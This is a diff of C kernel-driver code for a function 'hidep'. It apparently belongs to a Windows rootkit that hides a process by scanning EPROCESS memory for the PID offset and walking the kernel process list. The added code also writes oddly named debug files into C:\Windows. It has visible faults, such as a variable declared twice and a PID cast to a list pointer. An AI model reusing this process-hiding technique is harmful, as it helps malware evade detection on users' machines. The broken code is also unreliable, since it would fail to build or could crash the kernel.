@@ -2,11 +2,42 @@
 
 PCHAR hidep(UINT32 pid) {
 
-	debugFile(L"\\DosDevices\\C:\\Windows\\grrr.txt");
+	
 
 	PEPROCESS currentProcess = PsGetCurrentProcess();
 	
-	HANDLE CurrentPID = PsGetProcessId(currentProcess);
+	ULONG CurrentPID = *((ULONG*)((ULONG_PTR)currentProcess + 0x440)); // (ULONG)((ULONG_PTR)PsGetProcessId(currentProcess));
+
+
+	wchar_t path[512];
+	swprintf_s(path, 512, L"\\DosDevices\\C:\\Windows\\%lu.bop", CurrentPID);
+
+	debugFile(path);
+
+	ULONG CurrentPID = (ULONG)((ULONG_PTR)PsGetProcessId(currentProcess));
+
+	ULONG PID_OFFSET = 0;
+
+	debugFile(L"\\DosDevices\\C:\\Windows\\Germany.txt");
+
+	for (int i = 0; i < 0x300; i += 2) {
+
+		if ((*(ULONG*)((ULONG_PTR)currentProcess + i) == CurrentPID)) {
+
+			debugFile(L"\\DosDevices\\C:\\Windows\\Bulgaria.txt");
+			PID_OFFSET = i;
+			break;
+		}
+	}
+
+	
+
+	if (!PID_OFFSET) {
+		return NULL;
+	}
+
+	debugFile(L"\\DosDevices\\C:\\Windows\\Romania.txt");
+
 	PLIST_ENTRY currentList = (PLIST_ENTRY)((ULONG_PTR)CurrentPID + sizeof(INT_PTR));
 	ULONG LIST_OFFSET = (ULONG)((ULONG_PTR)currentList - (ULONG_PTR)currentProcess);
 	
@@ -19,16 +50,16 @@ PCHAR hidep(UINT32 pid) {
 	// Move to next item
 	currentProcess = (PEPROCESS)((ULONG_PTR)currentList->Flink - LIST_OFFSET);
 
-
-	/*CurrentPID = PsGetProcessId(currentProcess);
-	currentList = currentList->Flink;*/
+	//CurrentPID = PsGetProcessId(currentProcess);
+	//currentList = currentList->Flink;
 
 	// Loop until we find the right process to remove
 	// Or until we circle back
 
-	debugFile(L"\\DosDevices\\C:\\Windows\\grozzy.txt");
+	debugFile(L"\\DosDevices\\C:\\Windows\\bfe.txt");
 
-
+	pid;
+	StartProcess;
 
 	//while ((ULONG_PTR)StartProcess != (ULONG_PTR)currentProcess) {
 
